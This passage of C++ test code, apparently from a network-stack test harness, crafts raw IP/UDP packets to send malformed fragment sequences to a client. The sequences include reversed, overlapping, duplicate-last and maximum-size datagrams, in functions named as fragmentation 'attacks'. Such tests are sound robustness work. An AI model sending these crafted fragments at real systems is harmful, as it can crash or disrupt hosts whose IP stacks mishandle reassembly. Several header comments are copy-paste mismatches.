------------------------
//
// Description: Test where server sends a 4-part fragmented datagram in reverse order
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragFullReverseAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = (DEFAULT_FRAG_COUNT - 1); i >= 0; --i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == (DEFAULT_FRAG_COUNT - 1)) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset( i * 2);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMidReverseAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the
// middle two fragments are in reverse order
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMidReverseAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			pIPPacket->IPHeader.SetFlag((i == DEFAULT_FRAG_COUNT - 1) ? 0 : IPFLAG_MOREFRAGS);

			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(2 * 2);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(1 * 2);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(3 * 2);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				break;
			}
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);
			
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragLastInSecondAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the
// the last fragment arrives second
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragLastInSecondAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);


			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(3 * 2);
				pIPPacket->IPHeader.SetFlag(0);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(1 * 2);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(2 * 2);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				break;
			}
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);
			
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMixedSizeAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the fragments
// are of varying sizes.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMixedSizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[32];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(72);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 24);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 24, TRUE);
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(4);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(6);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(7);
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			}
						
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOneHundredAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 100-part fragmented datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOneHundredAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 100; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == 99) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset(i * 2);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(1600);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMultipleLastFragmentAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 100-part fragmented datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMultipleLastFragmentAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 3; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(48);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				break;
			case 1:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(4);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(2);
				break;
			}
			
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOverlappingFragmentsAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends 7 fragments containing overlapping data
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOverlappingFragmentsAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 7; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(40);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'a', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 1:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(1);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'a', 8);
				memset(PayloadBuffer + 8, (int)'b', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 2:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(2);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'b', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 3:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(2);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'b', 8);
				memset(PayloadBuffer + 8, (int)'c', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 4:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(3);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'c', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 5:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(3);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'c', 8);
				memset(PayloadBuffer + 8, (int)'d', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(4);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'d', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			}
			
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxDatagramSizeAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 64 1K (one is 1K - 1) fragments of a datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxDatagramSizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 64; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 1);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
